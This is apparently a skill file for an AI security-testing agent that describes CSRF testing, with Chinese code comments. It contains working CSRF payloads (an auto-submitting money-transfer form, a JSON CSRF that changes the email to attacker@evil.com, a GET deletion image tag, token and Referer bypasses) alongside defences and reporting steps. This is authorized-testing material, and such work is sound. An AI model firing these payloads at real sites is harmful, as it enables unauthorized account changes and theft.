---
name: csrf-testing
description: Professional skills and methodology for CSRF (Cross-Site Request Forgery) testing
version: 1.0.0
---

# CSRF (Cross-Site Request Forgery) Testing

## Overview

CSRF (Cross-Site Request Forgery) is an attack technique that leverages a user's logged-in session to perform unauthorized actions. This skill provides methods for detecting, exploiting, and preventing CSRF vulnerabilities.

## Vulnerability Mechanics

- The attacker tricks the user into visiting a malicious page
- The malicious page automatically sends requests to the target website
- The browser automatically attaches the user's authentication credentials (cookies, session)
- The target website mistakenly treats the action as a legitimate user operation

## Testing Methodology

### 1. Identify Sensitive Operations

- Password changes
- Email changes
- Money transfers
- Permission changes
- Data deletion
- Status updates

### 2. Detect CSRF Tokens

**Check whether token protection exists:**
```html
<!-- 有Token保护 -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- 无Token保护 - 存在CSRF风险 -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Verify Token Validity

**Test whether the token is predictable:**
- Is the token based on a timestamp
- Is the token based on the user ID
- Can the token be reused
- Is the token shared across multiple requests

### 4. Check Referer Validation

**Test whether the Referer check can be bypassed:**
```javascript
// 正常请求
Referer: https://target.com/change-password

// 测试绕过
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (空)
```

## Exploitation Techniques

### Basic CSRF Attack

**Automatic HTML form submission:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypassing Content-Type checks:**
```html
<!-- 使用form表单提交JSON -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET Request CSRF

**Exploiting GET requests:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### Token Bypass

**If the token is stored in a Cookie:**
```javascript
// 如果Token同时存在于Cookie和表单中
// 可以尝试只提交Cookie中的Token
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // 不包含csrf_token参数，依赖Cookie
});
```

### SameSite Cookie Bypass

**Leveraging subdomains:**
- If SameSite=Lax, cookies are still sent with GET requests
- Use a subdomain to carry out the attack

### Double Submit Cookie

**Bypassing token validation:**
```html
<!-- 如果Token在Cookie中，且验证逻辑有缺陷 -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // 从Cookie中读取Token
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tool Usage

### Burp Suite

**Using the CSRF PoC generator:**
1. Intercept the target request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# 使用ZAP进行CSRF扫描
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and Reporting

### Verification Steps

1. Confirm the target operation has no CSRF token protection
2. Construct the malicious request and verify it executes
3. Assess the impact (data leakage, privilege escalation, financial loss, etc.)
4. Document a complete PoC
5. Use the `report_finding` tool to record confirmed vulnerabilities in the platform (the sole entry point for recording vulnerabilities in this platform); the fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Report Essentials

- Vulnerability location and affected operations
- Attack scenario and impact scope
- Complete exploitation steps and PoC
- Remediation recommendations (CSRF tokens, SameSite cookies, Referer validation, etc.)

## Protective Measures

### Recommended Solutions

1. **CSRF Token**
   - Include a unique token in every form
   - Store the token in the session
   - Validate the token's validity

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double Submit Cookie**
   - Token present in both cookie and form
   - Verify the two match

4. **Referer Validation**
   - Verify the Referer is same-origin
   - Handle empty Referer values carefully

## Important Notes

- Only test in authorized testing environments
- Avoid causing actual impact on user accounts
- Document all testing steps
- Consider behavioral differences across browsers
